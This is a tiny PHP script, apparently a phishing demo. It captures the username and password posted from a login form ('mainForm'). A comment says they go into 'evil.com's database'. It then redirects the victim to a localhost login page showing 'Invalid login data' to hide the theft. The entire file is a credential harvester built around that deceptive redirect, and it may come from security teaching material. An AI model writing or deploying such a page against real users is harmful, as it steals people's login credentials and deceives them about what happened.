<?php
  $username = $_POST['mainForm:username']; 
  $password = $_POST['mainForm:password'];
    
  // insert into evil.com's database
    
  header("Location: http://localhost:8080/faces/pages/login.xhtml?msg=Invalid+login+data");
?>
